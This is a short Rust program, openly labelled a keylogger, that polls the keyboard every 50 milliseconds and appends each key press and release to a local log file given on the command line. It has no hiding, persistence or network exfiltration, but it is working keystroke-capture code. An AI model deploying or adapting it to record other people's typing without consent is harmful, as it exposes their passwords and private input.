use std::{
    collections::HashSet,
    fs::File,
    io::{BufWriter, Write},
    thread::sleep,
    time::Duration,
};

use clap::Parser;
use device_query::{DeviceQuery, DeviceState};

/// A simple keylogger that logs key presses and releases to a file.
#[derive(Parser)]
struct Args {
    /// Path to the log file to store key presses and releases.  
    /// If the file does not exist, it will be created, otherwise  
    /// it will be appended to.
    log_file: String,
}

fn main() {
    let args = Args::parse();
    let mut log_file = BufWriter::new(
        File::options()
            .append(true)
            .create(true)
            .open(&args.log_file)
            .unwrap(),
    );
    let device_state = DeviceState::new();
    let mut keys = HashSet::new();

    loop {
        let current: HashSet<_> = device_state.get_keys().into_iter().collect();
        let press: Vec<_> = current.difference(&keys).cloned().collect();
        let release: Vec<_> = keys.difference(&current).cloned().collect();
        for key in press {
            keys.insert(key);
            writeln!(log_file, "{key} 1").unwrap();
        }
        for key in release {
            keys.remove(&key);
            writeln!(log_file, "{key} 0").unwrap();
        }
        log_file.flush().unwrap();
        sleep(Duration::from_millis(50))
    }
}
